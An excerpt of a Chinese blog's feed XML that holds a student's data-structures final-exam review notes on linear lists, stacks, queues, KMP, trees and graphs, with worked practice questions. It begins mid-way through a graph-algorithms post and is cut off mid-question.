退出,输入一个负数！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="shu-chu-shi-li">输出示例</h1><p>1.邻接表建立无向图<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200531175649148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>2.邻接表表示图的深度优先搜索遍历<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200531175714907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>3.邻接矩阵建立有向图<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020053117573588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>4.邻接矩阵的深度优先搜索遍历<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200531175756163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>5.迪杰斯特拉算法<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200531175821830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;shi-yan-xing-zhi-zong-he-xing-shi-yan&quot;&gt;实验性质：综合性实验&lt;/h1&gt;
&lt;h1 id=&quot;yao-qiu&quot;&gt;要求：&lt;/h1&gt;
&lt;p&gt;（1）采用邻接矩阵/邻接表建立图；&lt;br&gt;
（2）采用深度优先/广度优先搜索方式遍历图；&lt;br&gt;
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://zssblog.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
      <category term="数据结构" scheme="http://zssblog.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>数据结构期末总结</title>
    <link href="http://zssblog.top/2020/05/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/"/>
    <id>http://zssblog.top/2020/05/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/</id>
    <published>2020-05-31T08:02:00.000Z</published>
    <updated>2020-06-28T09:40:54.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xie-zai-qian-mian">写在前面</h1><p>为迎接期末，总结了下知识点，供个人复习使用，仅供参考。</p><p>本文用到的复习资料：<a href="https://pan.baidu.com/s/1M5zHduugp_MMGL9VuNNxYg" target="_blank" rel="noopener">点我跳转</a>，提取码：6q5q</p><p>若需要本文markdown文件下方评论留言看到即回</p><h1 id="xu-lun">绪论</h1><h2 id="zhi-shi-dian" id="知识点"><a class="header-anchor" href="#知识点">¶</a>知识点</h2><p>1.逻辑结构：数据之间的相互关系。（与计算机无关）</p><ul><li>集合 结构中的数据元素除了同属于一种类型外，别无其它关系。</li><li>线性结构 数据元素之间一对一的关系</li><li>树形结构 数据元素之间一对多的关系</li><li>图状结构或网状结构 结构中的数据元素之间存在多对多的关系</li></ul><p>也可分为线性结构(可理解成一条直线能串起来)和非线性结构</p><p>2.存储结构分为顺序存储结构和链式存储结构（散列、索引）  （与计算机有关）</p><p>3.算法<strong>五个特性</strong>： 有穷性、确定性、可行性、输入、输出</p><p>4.算法设计要求：正确性、可读性、健壮性、高效性。  (好的算法)</p><p>5.typedef可以理解成给现有数据类型起个别名</p><p>例如：typedef struct{…}SqList，即给struct{…}起了个名字叫SqList</p><p>也用于类似于typedef int ElemType; 给int 起个别名叫ElemType即ElemType a;等价于int a;</p><p>这样做的好处是代码中用ElemType定义变量，如果想修改变量类型只需修改typedef ** ElemType即可，而不用一一修改。</p><blockquote><p>我们注意到有时候会有typedef struct LNode{…}LNode，即struct后有个LNode,这是因为如果结构体内部有指向结构体的指针则必须在struct后面加上LNode(单链表里有next指针struct LNode *next)</p></blockquote><p>6.时间复杂度：基本操作的执行次数（可以理解成就看执行了多少次）</p><p>7.研究数据结构就是研究数据的逻辑结构、存储结构及其基本操作</p><p>8.抽象数据类型的三个组成部分为数据对象、数据关系、基本操作。</p><p>9.数据：描述客观事物的符号</p><p>数据元素：是数据的基本单位（元素、结点）</p><p>数据项：组成数据元素的最小单位  （如学生信息表中的学号、姓名等）</p><p>数据对象：相同性质的数据元素的集合（如大写字母）</p><blockquote><p>大小关系为：数据=数据对象 &gt; 数据元素 &gt; 数据项</p></blockquote><p>10.数据结构：相互之间存在一种或多种特定<strong>关系</strong>的数据元素的集合</p><p>11.数据的运算包含：插入、删除、修改、查找、排序</p><p>12.算法：解决某类问题而规定的一个有限长的操作序列</p><p>13.算法的空间复杂度：算法在运行时所需存储空间的度量</p><h2 id="xi-ti" id="习题"><a class="header-anchor" href="#习题">¶</a>习题</h2><p>1.通常要求同一逻辑结构中的所有数据元素具有相同的特性， 这意味着( B )。<br>A. 数据具有同一特点<br>B. 不仅数据元素所包含的数据项的个数要相同， 而且对应数据项的类型要一致<br>C. 每个数据元素都一样<br>D. 数据元素所包含的数据项的个数要相等</p><p>2.以下说法正确的是(  D )。<br>A. 数据元素是数据的最小单位<br>B. 数据项是数据的基本单位<br>C. 数据结构是带有结构的各数据项的集合<br>D. 一些表面上很不相同的数据可以有相同的逻辑结构</p><p>答：数据元素是数据的基本单位，数据项是数据的最小单位，数据结构是带有结构的各数据元素的集合</p><p>3.算法的时间复杂度取决于（ D  ）。<br>A．问题的规模 B．待处理数据的初态C．计算机的配置 D． A 和 B</p><p>答：肯定与问题规模(难和简单的问题)有关，不过也与初态有关，比如某些排序算法，若初始已经排好序可能时间复杂度就会降低。</p><p>4.下列算法时间复杂度为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">1</span>;k&lt;=n;k*=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;j+=<span class="number">1</span>)</span><br><span class="line">        count++;</span><br></pre></td></tr></table></figure><p>答：最外层循环数值为2<sup>0</sup>,2<sup>1</sup>,2<sup>2</sup>…所以假设执行m次即2<sup>m</sup>=n所以外层执行了log<sub>2</sub><sup>n</sup>次</p><p>内层执行了n次，所以时间复杂度为nlog<sub>2</sub><sup>n</sup>（可理解为log<sub>2</sub><sup>n</sup>个n相加）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fact</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> n*fact(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答：第一次是n*fact(n-1)，然后是n*(n-1)*fact(n-2)…一直到n(n-1)(n-2)…2*1</p><p>但是我们要看执行了多少次，也就是函数fact调用了多少次，从n到1也就是n次，所以时间复杂度为O(n)</p><h1 id="xian-xing-biao">线性表</h1><h2 id="zhi-shi-dian-1" id="知识点-v2"><a class="header-anchor" href="#知识点-v2">¶</a>知识点</h2><p>1.线性结构：第一个无前驱，最后一个无后继，其他都有前驱和后继</p><p>2.顺序表插入一个元素平均移动n/2个元素，删除平均移(n-1)/2个</p><blockquote><p>插入的那一位置需要向后移，删除的位置那一位不用移(直接覆盖)所以删除少1</p></blockquote><p>3.首元结点：存储第一个有效数据元素的结点</p><p>头结点：首元结点之前指向首元结点的结点，为处理方便而设</p><p>头指针：指向第一个结点(有头结点指头结点没有指首元结点)的指针</p><blockquote><p>单链表通常用头指针命名</p></blockquote><p>4.随机存取：可以像数组一样根据下标直接取元素</p><p>顺序存取：只能顺藤摸瓜从前往后一个一个来</p><p>5.单链表加一个前驱指针prior就变成了双向链表</p><p>6.单链表最后一个元素的next指针指向第一个结点即为循环链表  (属于线性表！)</p><p>7.线性表和有序表合并的时间复杂度</p><p>线性表的合并时间复杂度为O(m*n)</p><p>A=(7,5,3,11)，B=(2,6,3)，结果为A=(7,5,3,11,2,6)</p><p>算法需要循环遍历B(O(n))且LocateElem(A)(判断是否与B重复为O(m))所以为O(m*n)</p><p>有序表的合并时间复杂度为O(m+n)</p><p>A=(3,5,8,11)，B=(2,6,8)，结果为A=(2,3,5,6,8,11)</p><p>算法只需同时遍历A和B，然后将还没遍历完的那个直接插到最后就行，所以是相加</p><p>8.顺序表和单链表的比较</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200619160333275.png"  alt="image-20200619160333275"></p><p>9.单链表也是线性表(一对一的关系，用绳子可以穿起来)的一种</p><p>10.顺序表存储密度(数据占比/结点占比)等于1，单链表的小于1(因为要存指针)</p><h2 id="xi-ti-1" id="习题-v2"><a class="header-anchor" href="#习题-v2">¶</a>习题</h2><p>1.线性表只能用顺序存储结构实现  （X）也可用链式如单链表</p><p>2.在双向循环链表中，在 p指针所指的结点后插入 q所指向的新结点，其修改指针的操作是（ C ）。</p><p>A. p-&gt;next = q; q-&gt;prior = p; p-&gt;next-&gt;prior = q; q-&gt;next = q;</p><p>B. p-&gt;next = q; p-&gt;next-&gt;prior = q; q-&gt;prior=p; q-&gt;next = p-&gt;next;</p><p>C. q-&gt;prior = p; q-&gt;next = p-&gt;next; p-&gt;next-&gt;prior = q; p-&gt;next = q;</p><p>D. q-&gt;prior = p; q-&gt;next = p-&gt;next; p-&gt;next = q; p-&gt;next-&gt;prior = q;</p><p>答：这样的题只能画图看看对不，但是我们可以看到在p的后面插入，那么p-&gt;next就不能非常早的更改否则就会出现找不到的情况，所以排除A,B。C和D画个图试下</p><p>3.在一个有127个元素的顺序表中插入一个新元素并保持原来顺序不变，平均要移动的元素个数为（ B）。<br>A. 8 B. 63.5C. 63 D. 7</p><p>答：插入平均移动n/2即63.5，注意不用取整</p><h1 id="zhan-he-dui-lie">栈和队列</h1><h2 id="zhi-shi-dian-2" id="知识点-v3"><a class="header-anchor" href="#知识点-v3">¶</a>知识点</h2><p>1.栈和队列是操作受限的线性表（1对1）</p><p>2.栈后进先出，只能在栈顶(表尾)插入删除</p><p>3.队列先进先出，队头删除，队尾插入(和平常排队一样排后面)</p><p>4.顺序栈栈空时：S.top=S.base     栈顶指针等于栈底指针</p><p>栈满时：S.top-S.base=S.stacksize   栈顶-栈底等于最大空间</p><p>5.链栈在栈顶操作，用链表头部作为栈顶即可，不需要头结点</p><p>栈空：S=NULL   (指向第一个结点的指针为空)</p><p>6.栈的应用：括号匹配，表达式求值(中缀式求值)，递归转非递归、函数调用</p><p>7.中缀表达式：符号在中间，如a+b，前缀就是+ab（前缀中缀指的是符号的位置）</p><p>8.循环队列队空：Q.front=Q.rear</p><p>队满：(Q.rear+1)%MAXSIZE==Q.front</p><p>队列元素个数：(Q.rear-Q.front+MAXSIZE)<strong>%MAXSIZE</strong></p><p>入队：Q.rear=(Q.rear+1)<strong>%MAXSIZE</strong></p><p>出队：Q.front=(Q.front+1)<strong>%MAXSIZE</strong></p><h2 id="xi-ti-2" id="习题-v3"><a class="header-anchor" href="#习题-v3">¶</a>习题</h2><p>1.若一个栈以向量V[1…n]存储，初始栈顶指针 top设为n+1, 则元素x进栈的正确操<br>作 是（ C ）。<br>A. top++; V[top]=x;    B. V[top]=x; top++;   C. top–; V[top]= x;    D. V[top]=x; top–;</p><p>答：注意初始top为n+1，而存储下标为v[1]~v[n]，所以就不存在ABD中的v[n+2]或者v[n+1]。应该先让top减一使得指向最后一个地址v[n]，可以把它看成是倒过来的栈，然后存v[n-1]，v[n-2]…</p><p>2.用链接方式存储的队列，在进行删除运算时（  D  ）。<br>A. 仅修改头指针 B. 仅修改 尾指针 C. 头、尾指针都要修改 D. 头、尾指针可能都要修改</p><p>答：由于只能在队头删除，一般只需修改头指针(head=head-&gt;next)即可。但当删最后一个元素时(此时head=rear)删除后(delete p)尾指针就丢失了也得修改</p><p>3.一个递归算法必须包括( B )。</p><p>A. 递归部分C. 迭代部分B. 终止条件和递归部分D. 终止条件和迭代</p><p>答：算法有穷形所以都得有终止条件，递归算法那肯定得有递归部分</p><p>4.最不适合用作队列的链表是( A )。<br>A.只带队首指针的非循环双链表B.只带队首指针的循环双链表<br>C.只带队尾指针的循环双链表    D.只带队尾指针的循环单链表</p><p>答：就看找头尾指针好不好找，A只有头指针还非循环只能从头到尾遍历找到尾指针</p><p>5.表达式a*(b+c)-d的后缀表达式是( B )。<br>A. abcd*±B. abc+*d-C. abc*+d-D. -+*abcd</p><p>答：前缀后缀指的是运算符号位置，先看原运算顺序，先算(b+c)后缀表达式是bc+</p><p>原式然后算*，a*(bc+)后缀表达式是abc+*，然后是abc+*d-</p><p>6.已知循环队列存储在一维数组A[0…n-1]中，且队列非空时front和rear分别指向队头元素和队尾元素。若初始时队列为空，且要求第1个进入队列的元素存储在A[0]处，则初始时front和rear的值分别是（ B ）。</p><p>A.0，0B.0，n-1C.n-1，0D.n-1，n-1</p><p>答：平常入队时先在rear位置赋值，再把rear+1，即rear指向的是队尾元素的下一位置，所以入队时先赋值再加一。但是此题说的是rear指向队尾。也即第一个入队后队尾指向的是第一个元素的位置也即0，所以入队前rear那就是0前面的n-1而front默认都为0</p><h1 id="chuan-shu-zu-he-yan-yi-biao">串、数组和广义表</h1><h2 id="zhi-shi-dian-3" id="知识点-v4"><a class="header-anchor" href="#知识点-v4">¶</a>知识点</h2><p>1.求next数组和nextval数组</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200530144018875.png"  alt="image-20200530144018875"></p><p>当j=1(即第一个字符)时为特殊情况next和nextval均为0</p><p>:one: <strong>next数组</strong>：其值为当前字母前方的最大前后缀+1</p><p>例如：j=3(A)，前面有A，B。没有前后缀即为0，0+1=1</p><p>j=4(B)，前面有ABA，有前缀和后缀A，即前后缀为1，1+1=2</p><p>j=5(A)，前面有ABAB，前后缀为AB，2+1=3//ABA和BAB不等，所以AB为最大前后缀</p><blockquote><p>next[j]=k,它的意思是，当模式串的第j位与主串的第i位失配时，这时主串的位置不回退，而是将模式串退到第k位，再次与主串的第i位进行匹配。</p></blockquote><p>比如主串为ABAA，不匹配时next[4]=2，将模式串中的2位置即B与主串的最后A比较也就达到了不匹配时直接根据前后缀移动的目的</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/IMG_20200619_224917.jpg"  alt="IMG_20200619_224917" style="height:200px;width:400px" /><p>:two: <strong>nextval数组</strong>：两种情况</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200530144018875.png"  alt="image-20200530144018875"></p><p>若是不匹配就看next[j]数值，若当前字母和next[j]字母==不等==时，nextval等于上面落下来的next[j]</p><p>若是不匹配就看next[j]数值，若当前字母和next[j]字母==相等==时，nextval值为前面的那个nextval[]</p><blockquote><p>不等就用自家的，相等直接拿过来</p></blockquote><p>例如：j=2，next[2]为1表不匹配时退到下标为1的位置，1的位置是A和当前2对应的B不等用自家的所以next[2]落下来成为nextval[2]</p><p>j=3，next[3]=1表不匹配时模式串回退到下标为1的位置，1的位置是A和当前3对应的A相等，所以把前面的nextval数值拿过来即为nextval[3]</p><p>2.行优先和列优先</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200530152310875.png"  alt="image-20200530152310875"></p><p>其实就是行优先就是从上到下先一行一行的存，列优先就是从左到右一列一列的存</p><p>无论是哪个其元素如a[2][3]位置不变(但顺序变了)，行优先就是先存上面2行再到它，列优先就是先存左面3列再存它</p><p>3.广义表是线性表的推广，也称列表（暂时理解成python里的列表）</p><p>4.广义表元素可为原子或子表</p><p>广义表长度：即元素个数(最外层括号里的小括号算一个元素)</p><p>广义表深度：就看有多少对括号就行(注意要将里面的子表全部展开)</p><p>5.表头(Head)和表尾(Tail)：当表非空时，第一个元素为表头其余均为表尾</p><blockquote><p>注意表头是第一个元素所以不带最外层的那个括号，表尾带最外层的括号</p></blockquote><p>例如A=((a,b),c)，表头为(a,b)而表尾为©</p><p>6.串的子串个数为n(n+1)/2+1（1+1+2+…+n，空串也算所以加1）</p><p>7.主串长度为n，模式串长度为m，KMP算法时间复杂度为O(m+n)</p><h2 id="xi-ti-3" id="习题-v4"><a class="header-anchor" href="#习题-v4">¶</a>习题</h2><p>1.求子串数目</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200530201544055.png"  alt="image-20200530201544055"></p><p>2.串 “ababaabab” 的 nextval 为（A）</p><p>A. 010104101 B. 010102101C. 010100011 D0101010</p><p>3.设有数组 A[i,j], 数组的每个元素长度为 3 字节， i 的值为 1~8 , j的值为 1~10 ,<br>数组从内存首地址 BA 开始顺序存放， 当用以列为主存放时， 元素 A[5,8]的存储首地址为（B）</p><p>A. BA+ 141 B. BA+ 180C. BA+222 D. BA+225</p><p>答：以列为主那就是一列一列的存，[5,8]表示这是第8列，前面有7列是存满的，所以这是第(7*8)+5=61个元素，而其地址为BA+(61-1)*3=BA+180</p><blockquote><p>注意要不要减1的问题，可先试下，假如是第二个元素只需要加一倍的3即BA+3所以要减1</p></blockquote><p>4.二维数组 A 的每个元素是由 10 个字符组成的串，其行下标 i=0,1, …,8，列下标j=1,2, , ,10 。若 A 按行先存储，元素 A[8,5] 的起始地址与当 A 按列先存储时的元素（B）的起始地址相同。设每个字符占一个字节。</p><p>A． A[8,5] B ． A[3,10] C. A[5,8] D ． A[0,9]</p><p>答：一定要注意下标是否从0开始，这里共有9行</p><p>行优先，[8,5]前面有8行(0,1,2,3,4,5,6,7共8行)所以是第8*10+5=85个元素</p><p>列优先，[3,10]前面有9列，所以是第9*9+4=85个元素  （注意行标从0开始）</p><blockquote><p>计算总数记住行乘列，列乘行</p></blockquote><p>5.广义表 ((a,b,c,d)) 的表头是（ C ），表尾是（ B ）</p><p>A． a B ． ( ) C． (a,b,c,d) D． (b,c,d)</p><p>答：第一个元素为表头其余均为表尾，所以表尾要带个外层的括号</p><p>6.设广义表 L=((a,b,c)) ，则 L 的长度和深度分别为（ 1和2 ）。</p><p>答：长度就看有多<strong>长</strong>(元素个数)，深度就看有多<strong>深</strong>（括号层数）</p><p>7.以行序为主序方式，将n阶对称矩阵A的下三角形的元素(包括主对角线上所有元素)依次存放于一维数组B［1…(n(n+1))/2-1］中，则在B中确定a<sub>ij</sub> (i&lt;j) 的位置k的关系为(  B   )  。</p><p>A.i*(i-1)/2+jB.j*(j-1)/2+iC.i*(i+1)/2+jD.j*(j+1)/2+i</p><p>答：注意题目说的是确定a<sub>ij</sub> (i&lt;j) ，i要小于j，但存的是下三角元素，假如a<sub>13</sub>=5，确定a<sub>13</sub>的位置就是确定5的位置，而a<sub>13</sub>=a<sub>31</sub>也就是根据i,j (i=1,j=3) 确定a<sub>31</sub>的位置，B中代入即3*1+1=4，而a<sub>31</sub>位置正是4(前面是1+2)</p><h1 id="shu-he-er-cha-shu">树和二叉树</h1><h2 id="zhi-shi-dian-4" id="知识点-v5"><a class="header-anchor" href="#知识点-v5">¶</a>知识点</h2><p>1.满二叉树(最完美最满的状态)   完全二叉树(编号是连续的即最右面缺而且是最后一层缺)</p><p>完全二叉树度为1的结点个数为0或1</p><p>当前结点编号为i，它的左孩子编号为2i，右孩子为2i+1（从1开始时）</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200604171747502.png"  alt="image-20200604171747502"></p><p>2.二叉树常用性质</p><ul><li>n<sub>0</sub> = n<sub>2</sub>+1 即叶子节点个数为度为2的结点个数加1</li><li>有 n 个结点的完全二叉树的深度为⎣log<sub>2</sub> <sup>n</sup>⎦+1 (没记住可以一个一个试)</li><li>深度为k的二叉树最多有2<sup>k</sup>-1个结点(满二叉树)</li></ul><p>3.二叉树遍历</p><ul><li>先序遍历NLR：根节点-&gt;左子树-&gt;右子树。</li><li>中序遍历LNR：左子树-&gt;根节点-&gt;右子树。必须要有中序遍历才能画出相应二叉树</li><li>后续遍历LRN：左子树-&gt;右子树-&gt;根节点。</li><li>助记：先后中遍历指的是根结点在先还是中还是右，且时间复杂度均为O(n)</li><li>层次遍历：一层一层从上到下，从左到右</li></ul><p>4.二叉树线索化目的是加快查找结点的前驱或后继的速度。实质上就是遍历一次二叉树，检查当前结点左，右指针域是否为空，若为空，将它们改为指向前驱结点或后继结点</p><p>5.哈夫曼树即带权路径最短树，也称最优树。</p><p>树的带权路径长度=树根到各==叶子==结点的路径(树根到该结点要走几步)乘对应权值；通常记作 WPL=∑wi×li</p><p>6.哈夫曼编码是最优前缀编码(任一个编码都不是其他编码的前缀，便于通信减少数据传输)</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200604205104233.png"  alt="image-20200604205104233" style="zoom: 50%;" /><p>哈夫曼树没有度为1的结点，且不一定是完全二叉树</p><p>7.树的存储结构有三种:双亲表示法、孩子表示法、孩子兄弟表示法,其中孩子兄弟表示法是最常用的表示法,任意一棵树都能通过孩子兄弟表示法转换为二叉树进行存储。</p><p>8.含有n个节点的二叉树共有(2n)!/(n!*(n+1)!)(常考3个节点共5种)</p><p>9.二叉树的高度是最大层次数(根节点为第一层)</p><p>10.树和二叉树均可以为空(注意树可为空是在严蔚敏教材中可空，有的地方规定不能为空)</p><p>11.树的先序对应二叉树的先序，树的后序对应二叉树的中序(这里的二叉树一般指经孩子兄弟法转换的树)</p><p>12.哈弗曼树属于二叉树有左右子树之分</p><h2 id="xi-ti-4" id="习题-v5"><a class="header-anchor" href="#习题-v5">¶</a>习题</h2><p><strong>1.</strong></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200604180443957.png"  alt="image-20200604180443957"></p><p>答：n<sub>0</sub>= n<sub>2</sub>+1              ==n<sub>1</sub>=0或n<sub>1</sub>=1==        n<sub>0</sub>+n<sub>1</sub>+n<sub>2</sub>=1001</p><p>**2.**注意题目说的是存储树，而树的存储结构中，孩子兄弟表示法又称二叉链表表示法</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200604181448145.png"  alt="image-20200604181448145"></p><p><strong>3</strong>.在一颗度为4的树T中，若有20个度为4的结点，10个度为3的结点，1个度为2的结点，10个度为1的结点，则树T的叶结点个数是______82_。</p><p>答：==任何树中，分支数(度数之和)比节点数少1==</p><p>题目中，分支数为20*4+10*3+1*2+10*1=122，所以有123个节点</p><p>度为0的节点为123-20-10-1-10=82</p><p>也可用公式n<sub>0</sub>=1*n<sub>2</sub>+2*n<sub>3</sub>+3*n<sub>4</sub>+1=1+2*10+3*20+1=82</p><p>**4.**设哈夫曼树中有199 个结点,则该哈夫曼树中有_100__个叶子结点</p><p>答：哈弗曼树没有度为1的结点,n0=n2+1,n0+n2=199,所以n0=100</p><p>**5.**一棵高度为4的完全二叉树至少有______8_个结点</p><p>答：前三层是满二叉树，最后一层只有一个即1+2+4+1=8</p><p><strong>6.</strong></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200605151226555.png"  alt="image-20200605151226555"></p><p>后是左右根，所以C是根，根据中序(左根右)得到DEBA均是C左子根</p><p>根据后序的DABE得到E是DABE的根，再由中序的DEBA得到D是E的左字根，BA是E的右子根</p><p>后序是左右根是AB，而中序是左根右是BA，正好相反则当没有左时正好是右根和根右，即B是根A是右</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200605151625428.png"  alt="image-20200605151625428" style="zoom:50%;" /><p>7.一颗高度为h的完全二叉树至少有_____2<sup>h-1</sup>__个结点</p><p>答：最少的情况就是前h-1层是满的，第h层只有一个。</p><p>即2<sup>h-1</sup>-1(前h-1层)+1(第h层)</p><p>8.有n个结点，高度为n的二叉树的数目为_____2<sup>n-1</sup>__</p><p>答：结点数和高度相同，那么每层都只有一个结点。对于除根节点以外的结点都可能是左子树或右子树，即有两种可能，n-1个2相乘即为2<sup>n-1</sup></p><p>9.二叉树遍历</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200607144152588.png"  alt="image-20200607144152588" style="zoom: 50%;" /><p>注意中序先访问C的左而不是先访问W的左</p><p>10.树与森林之间的转换（左孩子右兄弟）</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200607160958011.png"  alt="image-20200607160958011"></p><p>11.只要LTag为1表明线索为真即它肯定没左子树，为0表示一定有左子树<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200622224221397.png"  alt="image-20200622224221397"></p><h1 id="tu">图</h1><h2 id="zhi-shi-dian-5" id="知识点-v6"><a class="header-anchor" href="#知识点-v6">¶</a>知识点</h2><p>1.完全图：任意两个顶点都有边，都可达，有向完全图的边数(n*(n-1))是无向完全图的2倍</p><p>2.子图：一个图的一部分称为其子图</p><p>3.回路或环：简单来说就是转个圈</p><p>4.简单回路：转圈的过程不能有重复的点</p><p>5.连通图：图的每两个顶点都有一个到另一个的路径，若都互相可达就是强连通(不一定是完全图)</p><p>6.生成树：含图的全部顶点但只有n-1条边而且是连通图(就是用线串起来所有顶点)</p><p>7.邻接矩阵存储图，若没权值1代表有边，0代表没边。若有权值，有边存权值，没边存无穷大</p><p>8.图中度数之和为边数之和的2倍(一条边被两个顶点共用所以是2倍)</p><p>9.完全图要求每两个顶点都有一条边(无向时)，连通图只要求两个顶点之间存在路径就行(可能是多条边)</p><p>10.深度优先(DFS)即越深越好,直到不能再深了这时退到上一层继续深度优先。类似先序借助于栈(递归)</p><p>广度优先(BFS)就是越广越好类似层次遍历，而且先被访问的节点其子节点也先被访问。借助于队列(存放被访问的结点)</p><p>广度和深度若用邻接矩阵实现时间复杂度为O(n<sup>2</sup>)，邻接表是O(n+e)即O(顶点+边)</p><p>层次遍历就是一层一层从左到右遍历</p><p>树的先序，中序，后序遍历用栈，层次遍历用队列。</p><p>11.最小生成树：加权连通图的最小权值生成树，常用于修一条路使得可到所有顶点且花费最小</p><p>普里姆(Prim)算法：加点不构成回（选可达的最小的点）适合稠密图</p><p>克鲁斯卡尔(Kruskal)算法：加边不构成回（选现有的最小的边）适合稀疏图</p><p>12.v(vertex)是顶点，e(edge)是边</p><p>13.求某个点到其余各点的最短路径：迪杰斯特拉(Dijkstra)算法O(n<sup>2</sup>)（必考）</p><p>求每对顶点的最短路径：弗洛伊德(Floyd)算法O(n<sup>3</sup>)（不常考）</p><p>Floyd：比如求v0到其他顶点，在邻接矩阵中，v0这一行这一列这一主对角线划掉，剩下的中间经过v0看是否比原来路径短，若短则更新</p><p>14.拓扑排序：对有向无环图的顶点的一种排序</p><p>15.AOV网：在有向图中，用顶点表示活动，弧表示活动间的优先关系，则称此有向图为用顶点表示活动的网络（Activity On Vertex Network翻译即在顶点上的活动）</p><p>16.拓扑排序可以解决先决条件问题，比如学院有的课是其他课的基础，怎样排课的问题</p><p>找到入度为0的点输出，删除该点的所有出边，找到剩余点中入度为0的点输出，删除所有出边，重复操作(借用队列实现，若入度为0则入队，当前没有入度为0的点则出队，也可用栈二者结果不同)</p><p>17.AOE网：用顶点表示事件，弧表示活动(注意和AOV网相反)，弧上的权值表示活动持续时间(Activity On Edge Network)。其用于研究 1.完成工程最短时间      2.哪些活动是影响工程的关键</p><p>18.关键路径：即从源点(起始点)到汇点(最终点)最长的路径，路径上的活动称为关键活动</p><p>19.事件的最早发生时间：从前往后找前驱节点到当前节点的最大时间   前面的都完成就发生就是最早</p><p>事件的最迟发生时间：从后往前，后继节点的最迟-边的权值（找其中最小的）超过最迟后面就无法完成</p><p>源点和汇点的最早(都为0)和最晚(路径最大值)相同</p><p>20.有向图的极大强连通子图，称为强连通分量</p><h2 id="xi-ti-5" id="习题-v6"><a class="header-anchor" href="#习题-v6">¶</a>习题</h2><p>1.<img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200606154540943.png"  alt="image-20200606154540943"></p><p>答：若要让顶点最少，就是顶点之间的边尽可能的多，最好每两个点都有边，又说是非连通，那么可以一个连通图加一个点。8个顶点有(8*7)/2=28条边加一个点就是非连通，所以是9个点</p><p>2.一个有n个结点的图,最少有(1 